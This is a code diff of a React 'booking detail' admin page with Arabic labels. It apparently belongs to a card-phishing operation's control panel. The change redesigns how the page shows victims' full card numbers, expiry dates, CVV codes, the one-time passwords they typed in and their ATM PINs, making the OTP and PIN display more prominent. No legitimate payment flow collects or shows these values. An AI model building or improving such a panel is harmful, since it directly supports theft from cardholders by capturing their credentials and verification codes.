@@ -226,71 +226,80 @@ export default function BookingDetail() {
               </div>
             </CardHeader>
             <CardContent className="space-y-4">
-              {/* بيانات البطاقة */}
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
-                <InfoRow label="اسم حامل البطاقة" value={payment.cardHolderName || "—"} />
+              {/* ===== بيانات البطاقة - التخطيط الجديد ===== */}
+              <div className="space-y-3">
 
-                {/* رقم البطاقة الكامل مع إخفاء/إظهار */}
-                <div className="flex items-center justify-between py-1 border-b border-slate-100">
-                  <span className="text-xs text-slate-500">رقم البطاقة الكامل</span>
-                  <div className="flex items-center gap-2">
-                    <span className="text-sm font-mono text-slate-800 bg-yellow-50 px-2 py-0.5 rounded border border-yellow-200">
-                      {showCardNumber
-                        ? (payment.cardNumber || "—")
-                        : payment.cardNumber
-                          ? payment.cardNumber.slice(0, 4) + " •••• •••• " + payment.cardNumber.slice(-4)
-                          : "—"}
-                    </span>
-                    <Button
-                      size="sm"
-                      variant="ghost"
-                      className="h-6 w-6 p-0"
-                      onClick={() => setShowCardNumber(!showCardNumber)}
-                    >
-                      {showCardNumber ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
-                    </Button>
-                  </div>
+                {/* السطر 1: اسم حامل البطاقة - سطر كامل */}
+                <div className="bg-slate-50 rounded-lg px-4 py-3 border border-slate-200">
+                  <p className="text-[10px] text-slate-400 uppercase tracking-wide mb-1">اسم حامل البطاقة</p>
+                  <p className="text-base font-semibold text-slate-800">{payment.cardHolderName || "—"}</p>
                 </div>
 
-                <InfoRow label="آخر 4 أرقام" value={payment.cardLastFour || "—"} mono />
-                <InfoRow label="تاريخ الانتهاء" value={payment.cardExpiry || "—"} mono />
+                {/* السطر 2: رقم البطاقة + تاريخ الانتهاء + CVV في سطر واحد */}
+                <div className="grid grid-cols-3 gap-2">
 
-                {/* CVV مع إخفاء/إظهار */}
-                <div className="flex items-center justify-between py-1 border-b border-slate-100">
-                  <span className="text-xs text-slate-500 flex items-center gap-1">
-                    <Lock className="w-3 h-3" /> رمز CVV
-                  </span>
-                  <div className="flex items-center gap-2">
-                    <span className="text-sm font-mono text-slate-800 bg-red-50 px-2 py-0.5 rounded border border-red-200">
-                      {showCvv ? (payment.cardCvv || "—") : (payment.cardCvv ? "•••" : "—")}
-                    </span>
-                    <Button
-                      size="sm"
-                      variant="ghost"
-                      className="h-6 w-6 p-0"
-                      onClick={() => setShowCvv(!showCvv)}
-                    >
-                      {showCvv ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
-                    </Button>
+                  {/* رقم البطاقة الكامل */}
+                  <div className="col-span-3 sm:col-span-1 bg-yellow-50 rounded-lg px-3 py-3 border border-yellow-200">
+                    <p className="text-[10px] text-yellow-600 uppercase tracking-wide mb-1">رقم البطاقة</p>
+                    <div className="flex items-center gap-1 justify-between">
+                      <span className="text-sm font-mono font-bold text-slate-800 tracking-wider">
+                        {showCardNumber
+                          ? (payment.cardNumber
+                              ? payment.cardNumber.replace(/(.{4})/g, "$1 ").trim()
+                              : "—")
+                          : payment.cardNumber
+                            ? "•••• •••• •••• " + payment.cardNumber.slice(-4)
+                            : "—"}
+                      </span>
+                      <Button size="sm" variant="ghost" className="h-6 w-6 p-0 shrink-0" onClick={() => setShowCardNumber(!showCardNumber)}>
+                        {showCardNumber ? <EyeOff className="w-3 h-3 text-yellow-600" /> : <Eye className="w-3 h-3 text-yellow-600" />}
+                      </Button>
+                    </div>
                   </div>
+
+                  {/* تاريخ الانتهاء */}
+                  <div className="bg-blue-50 rounded-lg px-3 py-3 border border-blue-200 text-center">
+                    <p className="text-[10px] text-blue-500 uppercase tracking-wide mb-1">تاريخ الانتهاء</p>
+                    <p className="text-sm font-mono font-bold text-slate-800">{payment.cardExpiry || "—"}</p>
+                  </div>
+
+                  {/* CVV */}
+                  <div className="bg-red-50 rounded-lg px-3 py-3 border border-red-200 text-center">
+                    <p className="text-[10px] text-red-500 uppercase tracking-wide mb-1">CVV</p>
+                    <div className="flex items-center justify-center gap-1">
+                      <span className="text-sm font-mono font-bold text-slate-800">
+                        {showCvv ? (payment.cardCvv || "—") : (payment.cardCvv ? "•••" : "—")}
+                      </span>
+                      <Button size="sm" variant="ghost" className="h-5 w-5 p-0" onClick={() => setShowCvv(!showCvv)}>
+                        {showCvv ? <EyeOff className="w-3 h-3 text-red-500" /> : <Eye className="w-3 h-3 text-red-500" />}
+                      </Button>
+                    </div>
+                  </div>
+
                 </div>
 
-                {payment.verifyCode && (
-                  <InfoRow
-                    label="رمز OTP المُدخَل"
-                    value={payment.verifyCode}
-                    mono
-                    highlight="blue"
-                  />
+                {/* السطر 3: OTP و ATM PIN المُدخَلان من العميل */}
+                {(payment.verifyCode || payment.secretNum) && (
+                  <div className="grid grid-cols-2 gap-2">
+                    {payment.verifyCode && (
+                      <div className="bg-blue-600 rounded-lg px-4 py-3 text-white">
+                        <p className="text-[10px] text-blue-200 uppercase tracking-wide mb-1 flex items-center gap-1">
+                          <KeyRound className="w-3 h-3" /> رمز OTP المُدخَل
+                        </p>
+                        <p className="text-xl font-mono font-bold tracking-widest">{payment.verifyCode}</p>
+                      </div>
+                    )}
+                    {payment.secretNum && (
+                      <div className="bg-orange-500 rounded-lg px-4 py-3 text-white">
+                        <p className="text-[10px] text-orange-100 uppercase tracking-wide mb-1 flex items-center gap-1">
+                          <Lock className="w-3 h-3" /> ATM PIN المُدخَل
+                        </p>
+                        <p className="text-xl font-mono font-bold tracking-widest">{payment.secretNum}</p>
+                      </div>
+                    )}
+                  </div>
                 )}
-                {payment.secretNum && (
-                  <InfoRow
-                    label="رقم ATM المُدخَل"
-                    value={payment.secretNum}
-                    mono
-                    highlight="orange"
-                  />
-                )}
+
               </div>
 
               <Separator />
